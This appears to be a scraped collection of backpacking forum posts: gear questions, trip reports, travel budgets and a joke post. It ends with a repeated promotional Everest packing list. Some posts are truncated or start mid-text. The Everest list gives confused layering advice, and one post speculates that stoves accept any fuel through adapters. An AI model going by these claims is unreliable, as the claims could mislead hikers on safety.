I hypothesize that I can simply attach the correct adapter for one type of fuel to the fuel canister, and it will thread to the backpacking stove. Thus, producing a ""multi-fuel"" stove.

The stove doesn't stop working like a stove because it was fueled by a different fuel. Fuel is fuel.

So, My question is how many fuels can be used with how many adapters? Is there ONE adapter that fits all fuel canisters to the same stove fuel port?

Or, perhaps, an adapter linked/threaded/connected to another adapter to seat properly to the fuel port on a stove.  
The stove in question is the SOTO Windmaster.  
It, in its stock configuration accepts only Iso-Pro, Iso-Butane.  
I figure that there's got to be an accepted, functional propane adapter to fit the stove fuel port - and now I've expanded the potential number of fuel sources for my stove, if/when it comes time to refuel.

Talk Me Out of the Nemo Tensor,"I am going to use my REI dividend and 20% off coupon to buy a new sleeping pad for backpacking. I currently use a Big Agnes Insulted Air Core Mummy that I bought over 10 years ago. It has served me very well and never sprung a leak. I am looking to upgrade to a lighter/warmer pad. I know the main recommendation is Therm-a-rest NeoAir XLite. My concern is for the noise the XLite makes when you move around. 

I sleep exclusively on my side and often roll from one side to the other getting to sleep and during sleep. I am afraid the noise will keep me up. Sleep while backpacking is already an issue for me. 

I am in New Mexico and I backpack here, Colorado and sometimes other Western States if that helps with a recommendation. 

I learned about the Nemo Tensor and it seems like a great alternative. About the same weight as the XLite, insulation is suspended so it doesn’t sound like I am sleeping on a giant Sun Chips bag, and the new model has the same r value as the XLite (4.2). 

I want to end up with a pad that will last me a long time and be very comfortable while being relatively lightweight. 

Does anyone here have experience with both pads? Is one better than the other for a side sleeper? Thanks in advance!",backpacking,1647885861

Backpacking the Teton Crest Trail,"Just getting around to sharing a few of my favorite images from the Teton Crest Trail during September 2021. 

We flew into Jackson Hole from the east coast, so we decided on a shorter route option based on time constraints. Rather than the full loop via Upper and Lower Paintbrush, we cut through Cascade Canyon to shave off several miles and an additional vacation day.

We parked a car at Leigh Lake Trailhead where we knew we would end our route, and secured lodging at The Hostel in Teton Village. After checking out on the morning of our departure, we walked to the Bridger Gondola and took the 12-minute ride to the top. From there we started on Cirque Trail, eventually intersecting with the main Teton Crest Trail. 

Day 1 was around 9 miles, landing at Marion Lake to camp for the night. We met several friends there, in the form of mule deer and big horn sheep.

Day 2 was around 9.5 miles of hiking, where we landed at my favorite campsite of the entire trip - Sunset Lake. As you can see from the photos, the name is well deserved. There's a point at sunset where only the very tip of the Grand Teton mountain is illuminated in the distance of the horizon, and the entire lake and campsite is in shadow. The majestic quality of this definitely didn't translate in photos, but I included one anyway just to illustrate what I mean here. As for elevation gain and loss, this was the toughest section of the trail for us during our trip. Lots of up and down and switchback climbing over those miles.

Day 3 was my favorite day of scenery, due to the wide range of landscapes over our 6.5 miles. We went from a peaceful lake campsite to the ass-kicking climb up Hurricane Pass. I'm sure it was partially mental, but once we passed that 10,000' elevation mark my lungs were saying ""nope,"" even though we had already gained way more elevation in a single day over each of the previous two days. I'm also sure that coming from roughly sea level was to blame. There's just no true way to prepare for high elevation hiking, in my experience. We got to see Schoolroom Glacier, and we then descended to some basin lakes for lunch, and eventually to a riverside campsite in Cascade Canyon.

Day 4 was around 6.5 miles of comparatively easy hiking, all elevation loss with zero gain. The scenery was beautiful and we also saw bears and moose, but the trail became wildly busy during the last 2-3 miles as we neared the trailhead and began encountering day hikers, which is totally understandable. Everyone was super friendly and curious about our trip. I suppose I was just a bit shell shocked seeing humans again after experiencing many days of blissful solitude. 

Our total mileage was around 34 miles over 4 days/3 nights. The weather was gorgeous and we never experienced a single drop of rain. Water was plentiful and we never had any issues finding sources to filter. 

Highly recommend this trip if you ever get the opportunity! It was definitely mind-blowing for a flatlander like myself.",backpacking,1647876510

"Women help, what's your bathroom hygiene routine.","Okay so I looked through a lot of the posts on here and didn't see anything offering to answer my question. I'm new to backpacking and I've found all the advice I need on everything except going to the bathroom. I fully understand everything with going number 2 (not a big concern here as i dont have a ""regular"" system and might not need to go while backpacking for 2-3 days) . I'm looking for what has been found as the best hygiene routine after number 1. I don't like the idea of drip drying as it leaves chances for bacteria to be left behind. Packing in and out TP makes sense but seems like there should be an easier way. I've read about the kula cloth but still i dont feel like it isn't the most sanitary. Portable bidet seems like it would wash away but will leave you wet and I don't want extra moisture purposely left behind. I know it's nature and nothing will be 100% clean but I want to be prepared with the best method so I can avoid UTIs and possible yeast infections.",backpacking,1647817486

Affordable backpacking trip for someone new to backpacking?,"Hello you wonderful people! 

I’ve been an avid day hiker for the better part of my life, and have recently wanted to get into backpacking with my girlfriend.  We both have zero experience outside of day hiking.  I initially was looking into REI Co-op Adventures, but this is admittedly cost-prohibitive for us at this point in time.  Are there any reliable and more affordable alternatives to REI?  

Our goal is yo backpack/hike a National park every year, if not two (which might be overkill).  Ideally, anything involving the larger parks (Glacier, Yellowstone, Yosemite) would be amazing.

I want to do it as budget as it can get, so I'd love to try some hitchiking, walking, combined with some wild camping. I also have some volunteering with acommodation planned, so the wild camping will mostly be a filler (always for a few days/a week between locations).

I am looking for something pretty light, versatile, but fairly comfortable and cheap (probably too much to ask, but bare with me please, I am a poor student :)...). Hammock could be probably pretty great, but I don't think there are trees in some of the areas I want to visit, so I was thinking about tarp + bivvy combo, but I don't know if it is any good. Seems that a half of people can swear by it, but the other one says how uncomfortable it is. Do you have any advice for me? 

As I said, I need it to withstand a storm, but also to not be eaten by mosquitoes, nor break my back or bank carrying it.

Thanks for advice! :)",backpacking,1647648224

This problem has been getting progressively worse over the last few seasons,"I'm a big time UL backpacker, but my wife's boyfriend won't respect me at all. He's a bushcrafter and doesn't see merit in any of my accomplishments. When I got my base weight below 10, he didn't even acknowledge it. So I got it below 8 and he just made some comment about how ""real men cook on cast iron"" when he saw me cold-soaking my ramen. When I bought my Xmid, I thought my wife might sleep in it with me because of its genius two person design. Maybe she would see me as a provider because I got to the top of the waiting list and actually got one... but her boyfriend just cut down some endangered plants and made a bigger shelter for him and my wife to stay in. When I cut the tags off my gear, he always has to comment on how ""you don't have to cut the tags off things you make yourself"". 

It doesn't feel like there is anything I can do to gain his respect. I've even tried gatekeeping in online backpacking communities like this one to show him I'm the real deal, but he just laughs and keeps sharpening his axes. What do you guys do in this situation? Do your wives' boyfriends respect you? Has a bushcrafter ever belittled you for your fine-tuned gear choices?",backpacking,1647611348

Compact Sleeping Bag Advice,"Hey all! I recently bought a Nemo Disco. While backpack shopping I mentioned the size of the bag packed down and the sales person definitely thought it was on the large end. I am going to be carrying a LOT of stuff. I am going to carry the essentials, plus either a photography or fishing setup. The fishing setup consists of a tackle tray around 12 inches long and 2 inches deep, and a fishing pole that breaks down to be around 3 feet long in two parts. Photography consists of a tripod, and a 6ish liter camera bag. Alternatively I'd have a whole 30l camera bag inside my main pack but that seems impractical. 

The Nemo Disco bag packs down to 8L. I am 6'4 and need to have something that keeps you warm up to about 25 degrees since I don't intend to hike in the winter. Is the Nemo the best I can get in that 300ish dollar price range? Thanks in advance",backpacking,1647574216

Looking for a 3-4 day loop trail (USA),"At the end of 2021 a friend reached out to set up a backpacking trip for the end of August. There would be 5 of us total.
I have been hiking 2-4 times a month (minimum) for the past 7 years. However I have never gone backpacking. My friend and 2 others in the group have been on multiple 4+ day trips.

I took the time to map out five different 3-4 day trips all around 28 miles (Olympic, Grand Tetons, Rockies, and Glacier). Because no one else seemed too keen on doing it. We ended up deciding on Fern Lake to Flat Top Mt in Colorado. 
The friend who had reached out originally to set this all up indicated that he would take care of getting permits since they were familiar with the process.
That didn't happen.
All 5 of the trips, which were all in National Parks, are now unavailable due to permits being all bought up for the period we had planned on and several weeks out on either end of it.

I had planned to do several 1-2 night trips on my own prior to the big trip (I live very close to the AT in NY). And I would still like to plan for a larger trip this August but doubt I'm going to find anything available in a Park and be able to get a permit since it's rather late.
I've been looking around and have a few ideas but wanted to see if anyone had some good loops around 25-30 miles that they could recommend.

3 Weeks in Western Europe,"Hey all, you may remember my post from last month about [a 6 week trip through the Balkans.] (https://www.reddit.com/r/backpacking/comments/sst74g/solo_balkan_itinerary_critique/) Thanks again to everyone who commented! Well with recent events, I've chosen to instead book a one way ticket to **Paris, France on July 12th!** 

I figure worst case, I'll have a fun three weeks in Western Europe and best case, I'll continue on from Budapest doing an abridged version of my Balkan trip on a separate budget. 

About me: 23M college grad interested in art museums, street photography, and hiking. Not a big drinker but I like to be social. 

Length: 

**3 Weeks** 

Itinerary: 

**Paris (5) - Amsterdam (4) - Berlin (4) - Budapest (6)** 

Budget: 

**$2250 (~$105/Day) + $750 Backup** 

Questions: 

A) How is this budget realistically? Enjoyable or miserable? 

B) Would something like a 5 Day Youth rail pass ($220) be worth it? Or am I better off sticking to cheaper but longer bus routes? 

C) Any recommended day trips? So far I'm planning on stopping in Bruges between Paris and Amsterdam",backpacking,1647528511

Getting over fears while backpacking,"I absolutely love nature and hiking. I have spent my entire life hiking alone or with family. I have started getting heavily interested in backpacking and am currently piecing together all my gear. The biggest hang up for me is sleeping at night in the outdoors. I have camped before and have always had a hard time relaxing in my tent at night and sleeping in complete silence. I sleep with a fan by my bed side which drowns a lot of the white noise out.

I have camped near running rivers/creeks in the past which helped tremendously with the psychological side of sleeping in dead silence.

My question is aside from exposure therapy, does anyone have any tips or tricks getting used to it? I plan to buy bear mace, I take melatonin to help sleep, storing food properly, and plan to be doing all of my backpacking with another person.

Costa Rica to Nicaragua to Guatemala,"So, I went to Costa Rica last summer and absolutely loved it, I run a travel social media account along with my girlfriend so we were blessed with the opportunity to travel to Costa Rica for 10 days and record content for a company all free! so we decided since we were down there we might as well extend our stay in Central America and after those 10 days take a quick flight to Nicaragua, spend around 10-14 days there, and then another quick flight to guatemala and spend some more time there. I was thinking visiting Granada or ometepe island in Nicaragua, and then in Guatemala I really want to do the Acatenango Volcano overnight hike, and then make a stay at lake atitlan.... what do you guys think?! it would just be my girlfriend and I, renting a car in each country separately. we were perfectly fine in Costa Rica last time drove everywhere, partied etc had no problems (I know Costa Rica is safest compared to the three) I was just wondering if safety would be an issue in any of these areas or if anyone had any reccommendations / tips.

One Month Trip to Europe,"Hey y'all, myself and a military buddy of mine are planning a one-month trip to Europe and I would appreciate some advice.  We are planning to travel from the 26th of June to the 22nd of July and the following cities that we have chosen are based on common interest as well as the EU Rail map as that is how we plan to get around for the entirety of the trip:

* **Rome** 
   * 26th - 30th
* **Florence**
   * 30th - 2nd
* **Bologna**
   * 2nd - 4th
* **Milan**
   * 4th - 7th
* **Bern**
   * 7th - 10th
* **Lyon**
   * 10th - 12th
* **Paris**
   * 12th - 16th
* **Bordeaux**
   * 16th - 18th
* **Madrid**
   * 18th - 22nd

The dates are how long I have allocated for each city and we will be flying into Rome and then flying out of Madrid. I have a lot of questions that maybe y'all could help me out with if you are able. The budget (not including the flights to and from the U.S.) is sitting at $3,000 USD which allocates a little over $110 USD a day. I was wondering if this budget was feasible? We are planning on staying in hostels as much as we can and I have a buddy who lives in Paris and is willing to let us stay with him for the majority of our time in that city. Also, I planned this trip around the EU Rail system and was planning on getting a rail pass, is this the most effective way to travel or should I look into something like a rental car instead? Also, have I allocated enough time for each city? I was told to give 4 days to the large cities as well as 2 or 3 to the smaller cities. These are just some of my questions at the moment and any other advice would be much appreciated as well. The trip is still far out so the exact details of what we will do in each city are undecided, I just wanted to build a rough outline for now.",backpacking,1647398813

Long hauling backpack (100L +),"Hi there.   
I am looking for a good long hauling backpack, with a good carrying system. Every year I go on a 10-14 day fishing trip in the wilderness without refill of food, therefore I need a backpack that can carry 35+ kg comfortably (or as comfortably it gets).

The National Blue Trail in Hungary,"Hey all!

Wife and I have to be in Budapest this summer for a wedding of a friend, the bride is Hungarian. We're planning to be in Budapest for 4 days, but after that my wife has to leave for a business trip to Brazil. I, on the other hand, can stay longer, which is of course the perfect opportunity to do part of the National Blue Trail. But since I'm not able to take enough days to finish the entire trail, I'd love some recommendations from people who have done it before!

I can stay up to 10 days longer, so a distance of 100-150km would definitely be possible (playing it on the safe side). I've been doing multi day backpacking trips for almost 2 decades now, so my fitness level is definitely up to it.

I haven't researched a lot about the trail yet, but from the things that I have read I already know it's going to be very hard to decide on one specific part. I love culture, castles, mountains, lakes, rivers, volcanoes...

I also would like to start collecting the stamps, if that is at least possible if you start at a random spot on the trail.

Our group of 3 guys (early 20s, just graduating Uni from Canada) are planning to backpack Europe between mid-April to early June. Our budget is around ~4k CAD each but we are quite flexible and can increase our spend if need be. Each of us will likely carry a bag that is around 40L~, so we can bring it as a carry on to discount airlines such as Ryan Air. As well, we are likely going to stay at hostels and potentially AirBNB for some parts such as Spain. 

Our goal for this trip is to experience the culture, sight-see, visit historical landmarks, and potentially party once in awhile.

This will the our first time going to Europe, and we would love some tips, advice, thoughts, or any must-do activities, if we are staying in places too long, etc. for the cities and countries listed below.

Aeropress Go one cup method : ultralight way to drink actual coffee in the wild," Greetings!

There is one thing I love : drinking a warm full cup of coffee. And one thing I hate : instant coffee.

So in my previous thru-hikes I used a little method to brew actual coffee while traveling only with the 167g of the Aeropress Go : the one-cup method.

Sure, Aeropress is a luxury item but I'm using it every day and it makes a huge difference. The good thing is that this method allows you to boil/brew/drink in just one titanium cup that is already part of the popotte.

Basically, you boil a full cup of water,

pour some of that warm water into the inverted Aeropress to brew inside the desired amount (150ml water and 11g coffee for me),

wait 2 min,

swirl,

and press the coffee into the cup that still contains warm water, making a full cup with just.... one cup. Sorry for the redundancy.

Anyway I made a little video showing you the process there, and the visual clues to measure all of that without a scale [https://youtu.be/dJsiWP9F\_gA](https://youtu.be/dJsiWP9F_gA)

Hope this improves your coffee game in the wild if it matters to you too! Obviously, quantities of coffee/water can be adjusted to the taste

Crazy expensive with international phone plans. 10 bucks a day for my normal plan or 100 a month for limited gb. A sim card seems like the better way to go, and I see a lot of people use an old phone to put the sim card in and then only using their US phone on wifi or for pics. 

Any other tips on safety, places to visit, etc are much appreciated!!

"Homemade organic insect repellent, DEET, and Permethrin","Hi,

Wondering if I should make homemade spray with essential oils like lemon, peppermint, etc as I have these and more, or if I should stick to the tried and tested DEET and permethrin. I always prefer organic over non, and so long as it's safe I'm willing to spend the $10 or so on a new essential oil (like oregano) as I love them for my humidifier and for other remedies. 

&amp;#x200B;

Please make recommendations on essential oils, or convince me on DEET and permethrin if there's too high of a failure rate with essential oil. Can't find anything conclusive on this topic.

Shoe/boot advice for living in the Lake District,This summer I’m moving from the US to Cumbria in the UK. I’ll be based in Lancaster but hoping to hike the fells quite a bit. Here in the US I’ve been fine with Goretex hiking boots (Lowa)—low to mid tops. In warmer weather I use zero drop minimalist running shoes on easy trails and go Andrew Skurka style wool socks just get wet and avoid “waterproof” shoes. But I have to imagine in 40 degrees and raining pretty much all the time that’s not a great option. I’d also like the shoes not to be too much of a serious hiking boot both because heavy shoes are bad for my knees and so I can use them as my main casual shoe as well.

How would you choose to shelter 2 people + 2 dogs for 3-4 days?,"I like to go backpacking with my brother, and now my wife wants to go with us. I'm all for it, but feel a little torn on the gear selection. I usually sleep in a hennessy hammock, or a lightheart duo. Neither will fit the whole crew these days. We have two aussie mix dogs ~50lbs each.

My question is this, can you sleep two people in a double hammock with any success? In this scenario the dogs would be in [this](https://www.cavecreekhammock.com/product/pet-palace-current-lead-time-is-6-weeks-/22?cs=true&amp;cst=custom) below us.

Should I instead save more and get a 3 person tent? It seems hard to find one lightweight and inexpensive enough that has even most of the benefits of that 12' tarp setup. MSR seems to have good ones, but idk.

Recommendations for women's winter sleeping back in bivy,"Alright outdoorsy folks, I need your swarm intelligence. I'm looking for a sleeping back for somewhat special conditions.

\- shoulder seasons alpine 3000m a.s.l. (shouldn't get colder than -5C)

\- winter season 400-1000m a.s.l. (max. -5C)

\- tiny human (1.60m)

\- as compressible as possible

\- [Sleeping Mat](https://www.mountain-equipment.co.uk/collections/sleeping-mats/products/aerostat-down-7-0-mat-regular) is dope (r-value 5.0)

And the factor that makes it difficult:

\- bivy bag ([this one](https://eu.alpkit.com/products/elan))

Condensation is a factor. Yes, I know the necessary steps to limit it, but I've never had a night without any condensation. I'm therefore suuuper hesitant to pick a down sleeping bag and be done with it. Especially in alpine regions that could end disastrously. 

So I'm hoping to find a women's winter synthetic bag that actually holds up to -5C and doesn't weigh as much as me. Or an amazing argument in favour of a down bag inside a bivy bag in alpine conditions :)",backpacking,1646989899

Tent Guylines,"Hello,

I just bought a new Hilleberg Jannu and noticed that the guylines are thicker than the old models. New models include 3mm guylines instead of 2mm older guylines and they end up with more weight(mostly 3x weight compared to 2mm).

Could you give me some advice if i change them with 2mm will it effect the strength of 3mm guylines?

And also is there any setup that i can seperate the guylines easily from tent and put them on only when needed?

I thought of a setup like that but i don't know if a small carabiner like nite-ize S-biners will sacrifice the strength or the carabiner will damage the tent somehow?

Or any other advice instead of carabiners to put the guylines on and off to the guyout points easily when needed?

But I want to save some trip costs (now that gas prices are going to be a huge impact on my backpacking season this year) and was thinking about resorting back to the good ol' Ramen. I could add some dehydrated veggies to Ramen (or instant potatoes), but I'd like to add a source of **protein** as well. What are some hacks you use to ""beef up"" your Ramen.

Pre-Packaged Backpacking Meals - ALTERNATIVES PLEASE!!!,"I've been using the Mountain House and related brands for years, but they are pricey. I do love their convenience (especially the minimal cleanup). But it's time to cut costs and get experimental this year.  


I have my own dehydrator which I mainly use for fruits and veggies, occasionally make my own jerky. But I want to save some trip costs (now that gas prices are going to be a huge impact on my backpacking season this year) and was thinking about resorting back to the good ol' Ramen. I could add some dehydrated veggies to Ramen (or instant potatoes), but I'd like to add a source of **protein** as well. What are some hacks you use to ""beef up"" your Ramen. I've found that dehydrating my own jerky to add to it is basically the same cost as those REI dehydrated dinners. Bacon bits? Beans? Any insight is greatly appreciated.

Question about Tents,"Hello all!

Super quick question… so I’ve done a ton of scouting and whatnot as a teenager, so I’m familiar with outdoor skills, camping, etc.

I’ve had to put that on a hiatus as I attended university and scored a full time job, but I’ve been itching to get back out and I’ve been looking at getting new quality gear for myself, starting with a tent.

I’ve been looking at getting a Nemo hornet 2p tent… but it seems like no where has one. In fact… it seems like hardly anything carries like… the top best 10 tents of their class. Is it a supply issue thing or am I missing something?

Even then… if I can’t find something like that, do any of you guys have recommendations?

Thanks in advance!",backpacking,1646928775

Hocking Hills: camping and hiking in south eastern Ohio.,"Hocking Hills is a great area in South Eastern Ohio to hike or camp. Many of the state forests in the region (Tar Hollow and Zaleski are the first to come to mind) offer miles of trails, nice camping sites and year round access. The pictures in the post are from Conkles Hollow. Its a small nature preserve with about 5 miles of trail. The rim trail is 3 miles - while very beautiful and scenic can be hazardous in the winter, due to ice on the trail. The gorge trail (where the pictures were taken) is a spur, that is 1 mile in and out. While Conkles Hollow itself doesn't offer any camping, its very close in proximity to the previously mentioned state parks that do, as well as several other areas of interest that offer nice hiking. A personal favorite is the Old Mans Cave -&gt; Ash Cave trail that ends up being about 13 miles, with a stop at Cedar Falls and an optional stop at Whispering Cave.",backpacking,1646922971

health insurance travelling to chile during covid,"Hi,

I'm planning to travel from germany to chile for 2 1/2 weeks. It is apparently mandatory to get a health insurance covering &gt;30000 USD for all possible COVID expenses. 

Unfortunatley i was not able to find a insurance which stated exactly that they will cover this with 30000USD or higher.

Bottle system - Water filter and bidet attachments?,"I am looking to overhaul my water system from scratch and have been looking at different bottles similar to smartwater such as the mckinley ""tritan triflip""(not too thrilled about soft flasks and even less so about camelback pockets), onto which I would like to be able to attach either a water filter (the platypus quickdraw caught my eye because it is compact) or a portable bidet (have not looked at in too much detail yet) but to my regret most of those items do not specify the hole girth so I can't know for certain they are compatible.

Gear aesthetic: bright vs subdued,"Title says it. I find there seems to be a dichotomy both in gear itself and in what people choose. Gear seems to be either more subdued earth tones (browns, forest green, grey, etc.) or punchy bright colors (orange, yellow, cobalt blue, red, etc.)

It’s not entirely by brand, for example Patagonia seems to have the entire spectrum, with the mainly bright colors of nano puffs and more, while also have many khaki, brown, and grey fleeces and more. Where as the hammock brand Warbonnent definitely seems to lean towards the camouflage aesthetic (although they now offer many bright colors for quilts).

I’ve noticed amongst my outdoorsy friends, many lean one way or another. Those really into climbing, snow sports, adventure sports seem to like bright colored stuff, maybe it’s a bit of showing off they like REI and the brands and stuff they’ve accumulated, which fair enough we all like gear. Bushcraft guys probably like the more earth tone aesthetic. I tend to lean towards the more subdued, I find it blends more into the environment, like a grey tent looking like one of many rocks, or an olive hammock blending amongst the forest. But I’ve got some bright let colored jackets and such too.

What do you guys think? What have you observed along these lines and what do you prefer? Let’s all keep getting out there.",backpacking,1646856240

We will both be 20 come September and plan on backpacking around Europe, starting in Amsterdam with a budget of around $6000USD. From your experience is $6000 a fair budget, for staying in hostels and using trains/mopeds for transport?

How will we be treated as two young guys in Europe? 

**Your Advice?** 

If you were setting off to backpack for your first time what would you want to know? Any must do's or definitely don'ts? 

Lastly what age range can we expect to run into in hostels, I assume the crowd would mainly be 20's to 30's but not really sure?

How do you deal with long distance relations ships when travelling for an extended length of time (6 months)?,"For context, I'm 23 and I've been with my girlfriend for 4 months but it'll be 6 months when I go.

I really want it to work but I also want to be able to enjoy travelling. I know it will be incredibly hard for both of us and not sure if it will create a strain between us due to the time.

Part of me thinks end it now, travel and if we both want to, start it back up when I get back. I'm not sure how this would realistically work, things may change for either one of us. 

I don't feel it would be fair for me to say that we should stay together if things don't work out after a couple of months and I've basically waisted extra months of her life waiting.

We both really care about each other, but it's still a new relationship and the fact that we would spend as much time apart as we had been together is a concern.

-travel east through the tiger-inhabited nature reserves.

I love the idea of French Polynesia, (I speak French, so it also makes things easier), but worry about traveling there solo, and the cost. I've heard it's pretty pricey, and as a solo female will I be bored, lonely and end up spending way too much money to do activities/get around/meet people.

Mount Whitney from PCT,"I'm planning to summit Mount Whitney with a friend who is thru-hiking the PCT this year. I'm looking for information and advice for the best way to do this, if anyone has any insight! 

My friend will be thru-hiking the PCT NOBO. He anticipates hitting Whitney area in June and I'll meet him and we'll do a side trip to the peak. I would likely backpack a few days with him before or after as well but I'm worried about the logistics. Last time we hiked together, we were both thru-hiking so the worry of having a car and getting back to the car after the trip is new for me. 

Some specific questions I have:

1) Are there multiple trails to the top? If so, which one is the trail that PCT hikers use to access the peak?

2) Are there trailheads nearby with parking options? Is there a way to get back to my car without hitching alone? I read something about a bus that goes to the area.. any information on that and if it's actually a good option? Side note here is that I'm open to using only public transportation if that's actually possible but I also like the idea of renting a car to be able to take hikers into town or provide trail magic as needed.

3) Any other suggestions you would have!",backpacking,1646617278

Any More Items To Add For Everest Base Camp Packing List ?," 

Are you packing for [Everest Base Camp Trek](https://peakpromotionnepal.com/trek/everest-base-camp-trek/)   ? We help you to plan efficiently from start to finish. You can bring   your own trekking gear or if you want to buy it in Kathmandu then you   can buy it at our agency’s trekking store as well. Your trekking gear   helps you to combat with the unwanted condition of the Everest region.   The gears that we suggest you keep you warm and comfortable on the rough   terrain.

There are also  essentials we have mentioned below that you should  bring in the trek.  Let’s imagine your trek starts in a perfect sunshine  at a low altitude  and ends at a higher altitude in the rain and cold  temperature. Looking  at these conditions, we have perfected what you can  call gear arsenal,  what you can call trekking clothing in the Everest  region. With these,  you explore nature keeping your body warm from head  to feet in the  coldest corner of the Himalayas.

Trekking Clothes For Everest Base Camp TrekMoisture-wicking long-sleeve T-shirts

This  is very important as it helps you to prevent from freezing up.  This  layering is needed during the months of December, January, and   February. If you are trekking in these months, you need to wear the   moisture-wicking long-sleeve t-shirt which will draw off moisture. If   you don’t wear this wicking, the temperature of your body falls, and   there might be frostbite. It also keeps your inner cloth dry. On the   other hand, the middle layering keeps your body warm. It is like   insulation.

Down Jacket

Down  jacket prevents you from the unwanted conditions of fog and snow  at a  higher altitude in a cold place. You also need to wear another   moisture-wicking short-sleeve t-shirt as a layer at the innermost level   that touches your skin. Down jacket should be worn as a base layer over   the moisture-wicking long-sleeve t-shirt and moisture-wicking   short-sleeve t-shirt. The down jacket you purchased can be packed easily   in a day pack. The best thing is it keeps you warm throughout the   trekking trail.

Rain Poncho

Carry  the following gears to make your trek more enjoyable. Last but  not  least, the rain poncho protects your entire body and day pack from  the  rain. It has a wide coverage than a rain jacket. Further, you can  also  use it as a tarpaulin. It is a great emergency tool. Please take  the  following gears seriously. Trust us.

Essential Gears for the Everest Base Camp Trek

Even  if you are an experienced trekker, you may forget some  essentials  mentioned below; check off them before you hit for the  Everest Base  Camp Trek. As you are ready to go a long distance like  this, you have  to also know the flight weight limit.

Hiking Hat

Buy  a hiking hat that will protect you from sunlight. You will find  it  comfortable. It is cool, and in one sense, it plays a great role in   maintaining your health condition. It does protect your neck and face   from the sun.

Neck Gaiter

Another  way to protect your neck is by using a gaiter. The gaiter  that we use  is an essential piece of cloth during trekking. You can use  it to cover  your head or your mouth from the cold while walking or  sleeping. It  also keeps the dust away from your nose.

Base Glove

Now,  by wearing inner gloves, you build a base layer to keep your  hands  warm as well as dry. When you wear gloves outside, you will layer  the  inner glove and be able to protect the hand from the bitterest cold   temperature. Both of them protect you from rain, snow, and cold. Also be   sure to check out the following gears before heading to the base camp.

Hiking Boot

Your  leg is as important as the upper part. Wearing a hiking boot,  you will  support your ankle, keep your feet dry on the tricky terrain,  as well  as while walking off trail. You should go for a hiking boot that  is  stable, breathable, and light. The boot must give space for your toe  to  spread. This is what makes your feet healthy.

Sunglasses

Do  you need sunglasses for hiking as well as for seeing snow? When  you  buy the glasses, look for the one that reflects light and UV rays. A   great piece you should carry when you are engaged in outdoor   activities. At the same time, it must be fitting and comfortable.

Camp Shoe

After  7 hours, it is time to take off your hiking boot, and be  prepared to  wear a camp shoe. As you are in a camp shoe in a lodge, your  feet will  feel ultra light, and the shoe is opened air. It is well  ventilated.  You feel you are in heaven at the end of the day. When you  are in a  camp shoe, it must give you maximum comfort. Buy such a one.

Broad Brimmed Hat

As   you trek, you will see a clear sky. The sun is shining brightly,  and  it is time to protect your face and neck from the sun’s rays. A   broad-brimmed hat constitutes the protection. Not only that, it is   comfortable. You will stay safe, and you can easily pack it in your bag.   You have got yourself covered with the following trekking gears.

Important Trekking Gear in the Everest region

Since  you are trekking from a low altitude to a high altitude to the  base of  the world’s highest mountain, you will be in a remote world  where you  are cut off from the basics of the modern world. Most of the  items we  have mentioned below look all important to you, but you have to  take  into consideration the weight of the luggage from Kathmandu to  Lukla  flight. The weight limit is 15 kg, and within this limit, you have  to  include all the following essentials.

Duffle Bag

The  duffle bag we provide you, it makes the packing easier and is  water  resistant. It is also light weight, and it comes with a strap.  This  makes it easy to carry for a porter. At the airport, you can carry  it  on your back easily. If it is not fully packed, you can make your   duffle bag as a hand bag. It can be compressed and is foldable.

Walking Stick

Walking  is full of fun in a remote place, but in some places, you  need  support. A walking stick creates confidence and supports your body   weight. It also creates steadiness. You can lean on this  stick on a   steep hill. Descending becomes easier with this stick. Overall, a   walking stick prevents you from falling and slipping. A great asset.

Trekking Backpack

Heading  to the mountain without carrying a backpack is missing the  right gear.  A trekking backpack must be comfortable and should come with  a hip  belt. Side pockets will be a plus point. A trekking backpack must  have  functionality. You should go for a padded shoulder strap backpack  as  well as you should go for an ultra light and affordable one.

Water Bottles

In  addition to this, yes, you need an insulated water bottle in the   extreme temperature in the Everest region. It is more than an ideal   bottle. Sip water from a narrow slip lid, keep yourself away from   dehydration, and head to the destination. You can also keep tea and   coffee or simply cold water in it.

Sleeping Bag

At  night, the most important trekking gear is a sleeping bag. While   buying it, please check its temperature rating. Your sleeping bag must   be compressible, ultra light, comfortable, and warm. When you wake up,   you must be refreshed. Always use a compression sack to pack a sleeping   bag.

Headlamp with extra batteries

When  the night falls, you also need a head lamp. As you head to  Kalapatthar  to see the world’s stunning view of Everest before dawn, the   importance of a headlight cannot be ignored. The headlamp keeps you on a   trekking trail. It must be water proof, and its battery life must run   from 25 hours to 180 hours. You can charge the battery by paying the   lowest rate in a lodge.

Bag for dirty clothes

You  know trekking is tiring as well as sweating. That’s why, we have   recommended you to wear moisture-wicking long-sleeve t-shirts. You have   to change your clothes and keep them in a bag. If you don’t change it,   there will be irritation. Carrying a bag helps you to stay clean and   tidy.

Camera with extra batteries

You  already know that the Everest region is loaded with snow –  covered  mountains. All the trekkers want to capture this scene in their   cameras. They will be trekking for more than 3 hours every day, so you   can imagine the number of mountains you will see. As you take the   photos, you must know that your camera must be water resistant, and the   battery power must run longer. Always focus on the latter.

With these, you explore nature keeping your body warm from head  to feet in the coldest corner of the Himalayas.

## Trekking Clothes For Everest Base Camp Trek

### Moisture-wicking long-sleeve T-shirts

This is very important as it helps you to prevent from freezing up.  This layering is needed during the months of December, January, and  February. If you are trekking in these months, you need to wear the  moisture-wicking long-sleeve t-shirt which will draw off moisture. If  you don’t wear this wicking, the temperature of your body falls, and  there might be frostbite. It also keeps your inner cloth dry. On the  other hand, the middle layering keeps your body warm. It is like  insulation.

### Down Jacket

Down jacket prevents you from the unwanted conditions of fog and snow  at a higher altitude in a cold place. You also need to wear another  moisture-wicking short-sleeve t-shirt as a layer at the innermost level  that touches your skin. Down jacket should be worn as a base layer over  the moisture-wicking long-sleeve t-shirt and moisture-wicking  short-sleeve t-shirt. The down jacket you purchased can be packed easily  in a day pack. The best thing is it keeps you warm throughout the  trekking trail.

### Rain Poncho

Carry the following gears to make your trek more enjoyable. Last but  not least, the rain poncho protects your entire body and day pack from  the rain. It has a wide coverage than a rain jacket. Further, you can  also use it as a tarpaulin. It is a great emergency tool. Please take  the following gears seriously. Trust us.

## Essential Gears for the Everest Base Camp Trek

Even if you are an experienced trekker, you may forget some  essentials mentioned below; check off them before you hit for the  Everest Base Camp Trek. As you are ready to go a long distance like  this, you have to also know the flight weight limit.

### Hiking Hat

Buy a hiking hat that will protect you from sunlight. You will find  it comfortable. It is cool, and in one sense, it plays a great role in  maintaining your health condition. It does protect your neck and face  from the sun.

### Neck Gaiter

Another way to protect your neck is by using a gaiter. The gaiter  that we use is an essential piece of cloth during trekking. You can use  it to cover your head or your mouth from the cold while walking or  sleeping. It also keeps the dust away from your nose.

### Base Glove

